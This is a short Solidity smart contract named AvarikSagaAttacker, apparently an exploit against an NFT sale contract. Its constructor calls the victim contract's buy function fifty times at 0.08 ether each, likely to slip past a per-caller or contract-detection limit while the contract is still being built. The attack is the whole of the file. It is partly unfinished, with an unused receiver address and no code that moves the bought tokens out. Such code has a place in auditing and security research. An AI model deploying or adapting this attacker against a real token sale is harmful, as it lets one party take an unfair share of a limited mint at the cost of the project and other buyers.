// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./IAvarikSaga.sol";
import "@openzeppelin/contracts/interfaces/IERC721.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract AvarikSagaAttacker is Ownable {
    IAvarikSaga public victim;
    address public receiver;

    constructor(address _victim) payable {
        victim = IAvarikSaga(_victim);

        for (uint i = 0; i < 50; i++) {
            victim.buy{ value: 0.08 ether }(1);
        }   
    }

    function currentBalance() public view returns(uint256) {
        return address(this).balance;
    }

    fallback() external {

    }
}